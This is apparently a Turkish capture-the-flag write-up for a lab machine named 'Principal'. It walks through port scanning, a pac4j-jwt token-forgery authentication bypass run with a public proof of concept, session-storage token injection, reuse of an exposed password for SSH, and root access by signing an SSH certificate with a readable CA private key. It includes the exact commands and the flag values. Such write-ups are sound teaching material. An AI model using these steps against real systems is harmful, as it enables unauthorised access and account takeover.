## Giriş

Principal, ilk bakışta klasik bir web login sayfasıyla karşılıyor ama işin özü aslında kimlik doğrulama mantığındaki bir tasarım hatasında gizli. Makine boyunca iki kez aynı temayla karşılaşıyoruz: sistem, gelen verinin *şifrelenmiş/imzalı olup olmadığını* kontrol ediyor ama içindeki *kimlik iddiasının doğru olup olmadığını* hiç sorgulamıyor. Bu mantık hatası hem web tarafındaki JWT doğrulamasında hem de sunucudaki SSH sertifika yapılandırmasında karşımıza çıkıyor. Aşağıda adım adım nasıl root olduğumu anlatıyorum.

---

## 1. Keşif

İlk iş her zaman olduğu gibi tam port taraması:

```bash
nmap -sS -A -T4 -Pn -p- 10.129.79.220
```

Sonuç:

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy Jetty
|_http-title: Principal Internal Platform - Login
|_http-server-header: Jetty
|   X-Powered-By: pac4j-jwt/6.0.3
```

Sadece 2 port açık: SSH (22) ve üzerinde bir Jetty web servisi çalışan 8080. En dikkat çekici detay `X-Powered-By: pac4j-jwt/6.0.3` header'ı — bunu not ediyorum, ileride işime yarayacak.

---

## 2. Web Uygulamasını Keşfetme

`http://10.129.79.220:8080/login` adresine gittiğimde beni bir giriş ekranı karşılıyor.

Önce klasik bir refleksle SQLi bypass denedim ama dönen hata mesajlarından bir şey çıkmayacağını anladım. Bunun yerine sayfanın kaynak koduna bakmaya karar verdim. Kaynak kodda iki önemli yol dikkatimi çekti:

- `/reset-password`
- `/static/js/app.js`

`app.js` dosyasını inceleyince uygulamanın kullandığı API endpoint'lerini gördüm:

```js
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';
```

Bu endpoint'lerden ilk olarak JWKS (JSON Web Key Set) uç noktasını kontrol ettim:

```
http://10.129.79.220:8080/api/auth/jwks
```

Yanıt olarak bir RSA public key seti döndü:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "enc-key-1",
      "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2..."
    }
  ]
}
```

Uygulamanın JWT tabanlı bir kimlik doğrulama sistemi kullandığı netleşti. `/api/auth/login` endpoint'ine gittiğimde ise:

```
There was an unexpected error (type=Method Not Allowed, status=405)
```

hatası aldım — yani endpoint var ama farklı bir HTTP metodu bekliyor. Bunu not düşüp devam ettim, çünkü asıl anahtar ipucu zaten elimdeydi: **`X-Powered-By: pac4j-jwt/6.0.3`**.

---

## 3. CVE Araştırması — pac4j-jwt Kimlik Doğrulama Atlatması

`pac4j-jwt/6.0.3` sürümünü araştırınca karşıma **CVE-2026-29000** çıktı:

[CVE-2026-29000 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-29000)

Bu açık, `pac4j-jwt`'nin `JwtAuthenticator` sınıfında bulunuyor. Özetle:

> JWE (şifrelenmiş) zarf içine sarılmış bir `PlainJWT` (imzasız/plain JWT), doğrulama sürecinde **imza kontrolünü tamamen atlıyor.** Sistem sadece dış zarfın (JWE) geçerli olup olmadığını kontrol ediyor, içindeki JWT'nin imzalı olup olmadığını sorgulamıyor.

Bunun için hazır bir PoC buldum:

[CVE-2026-29000-pac4j-jwt-auth-bypass (GitHub)](https://github.com/PtechAmanja/CVE-2026-29000-pac4j-jwt-auth-bypass/)

`poc.py` dosyasını indirip çalıştırdım:

```bash
python3 exploit.py --jwks-url http://10.129.79.220:8080/api/auth/jwks --target http://10.129.79.220:8080/dashboard
```

Çıktı:

```
[+] Fetching JWKS from http://10.129.79.220:8080/api/auth/jwks
[+] Forged Token:
eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJjdHkiOiJKV1QiLCJlbmMiOiJBMTI4R0NNIn0...

[+] Browser Injection:
sessionStorage.setItem("auth_token", "eyJhbGciOiJSU0EtT0FFUC0yNTYi...")
```

Script, JWKS'ten aldığı public key ile geçerli bir JWE zarfı oluşturup içine imzasız (plain) bir JWT gömüyor. Sunucu zarfı şifreleme anahtarıyla açabildiği için içeriğe güveniyor — imza kontrolü hiç devreye girmiyor.

---

## 4. Token Enjeksiyonu ve Panel Erişimi

Sahte token'ı elde ettikten sonra `http://10.129.79.220:8080/login` sayfasına gittim ve tarayıcı geliştirici araçlarından:

**Inspect → Application → Session Storage → Add New**

diyerek `auth_token` adında yeni bir key oluşturup değerine forged token'ı yapıştırdım. Sayfayı yeniledikten sonra dashboard'a giriş yapmış oldum.

Panelde dolaşırken **Users** sekmesinde ilgimi çeken bir kayıt gördüm:

| Kullanıcı | Açıklama | Rol | Departman | Durum | Not |
|---|---|---|---|---|---|
| svc-deploy | Deploy Service | deployer | DevOps | Active | SSH sertifika tabanlı otomatik deployment servis hesabı |

Bu satır ileride işime çok yarayacaktı çünkü SSH sertifika doğrulaması ile ilgili bir ipucuydu.

Sonrasında **Settings** sekmesine geçtim ve orada açık şekilde yazan bir değer buldum:

```
encryptionKey: D3pl0y_$$H_Now42!
```

---

## 5. İlk Erişim — SSH ile Kullanıcı Ele Geçirme

Bulduğum değeri `svc-deploy` kullanıcısının SSH parolası/anahtarı olarak deneyip bağlandım:

```bash
ssh svc-deploy@10.129.79.220
```

Parola olarak `D3pl0y_$$H_Now42!` değerini girince başarıyla bağlandım. Ev dizininde `user.txt` dosyasını okudum:

```
user.txt: 0682db7635f33e7021303a549a1ac54f
```

---

## 6. Privilege Escalation — SSH CA Sertifikası Kötüye Kullanımı

Sistemde gezinirken `/opt/principal/ssh/` dizininde ilginç dosyalar buldum:

```
README.txt  ca  ca.pub
```

Bu dosyaları görünce writeup'ın en başındaki "Hakkında" kısmında bahsedilen SSH sertifika mekanizması aklıma geldi. Demek ki sunucu, SSH bağlantılarında **sertifika tabanlı kimlik doğrulama (SSH CA)** kullanıyordu. `ca` dosyası CA'nın private key'iydi ve buna okuma erişimim vardı — bu da CA'nın imzaladığı **her sertifikaya güvenildiği** anlamına geliyordu.

Yapılandırmadaki asıl zafiyet şuydu: sunucu, sertifikanın CA tarafından imzalanıp imzalanmadığını kontrol ediyordu ama sertifikanın içindeki **principal (kullanıcı adı) alanını doğrulamıyordu.** Yani CA private key'ine erişimim olduğu sürece, istediğim kullanıcı adına (örneğin `root`) sertifika imzalayabiliyordum.

Bunu istismar etmek için `/tmp` dizinine geçip yeni bir SSH key çifti oluşturdum:

```bash
ssh-keygen -f mykey -N ""
```

Sonra bu public key'i CA ile `root` kullanıcısı adına imzalattım:

```bash
ssh-keygen -s /opt/principal/ssh/ca -I root-cert -n root mykey.pub
```

Bu komut `mykey-cert.pub` adında imzalı bir sertifika üretti. Artık bu sertifikayı kullanarak `root` olarak `localhost`'a bağlanabiliyordum:

```bash
ssh -i mykey root@localhost
```

Ve bağlantı başarılı oldu — root shell elimdeydi.

---

## 7. Root Flag

```bash
cat /root/root.txt
```

```
root.txt: 49ebb99ec7f2fc42176f5d90e6ebb47e
```

---

## 8. Sonuç ve Öğrenilenler

Principal, bana kriptografide çok kritik bir prensibi bir kez daha hatırlattı: **"şifrelenmiş/imzalı olmak" ile "içeriği doğru olmak" aynı şey değildir.**

- Web tarafında `pac4j-jwt`, bir JWE zarfının geçerli olmasını "içindeki token güvenilirdir" olarak yorumladı ve imza kontrolünü atladı.
- Sistem tarafında SSH CA yapılandırması, sertifikanın CA tarafından imzalanmış olmasını "istenen kullanıcı için geçerlidir" olarak yorumladı ve principal alanını doğrulamadı.

İki farklı katmanda, aynı mantık hatasının tekrar etmesi bu makineyi benim için özellikle öğretici kıldı. Root'a giden yol karmaşık bir exploit zinciri değil, doğru yerde doğru soruyu sormamaktan kaynaklanan bir güven eksikliğiydi.

### Kısa Özet

| Adım | Aksiyon |
|---|---|
| Recon | Nmap ile 22 ve 8080 portları tespit edildi |
| Web Enum | `app.js` üzerinden API endpoint'leri bulundu |
| Zafiyet | CVE-2026-29000 (pac4j-jwt auth bypass) tespit edildi |
| Exploit | Forged JWE/JWT ile panele giriş yapıldı |
| Bilgi Sızıntısı | Settings sayfasından `svc-deploy` şifresi bulundu |
| User | SSH ile `svc-deploy` olarak erişim sağlandı |
| PrivEsc | SSH CA private key'i ile `root` için sertifika imzalandı |
| Root | Sertifika ile root olarak SSH erişimi sağlandı |

Flag'ler:
- **user.txt:** `0682db7635f33e7021303a549a1ac54f`
- **root.txt:** `49ebb99ec7f2fc42176f5d90e6ebb47e`

Okuduğunuz için teşekkürler, bir sonraki writeup'ta görüşmek üzere!
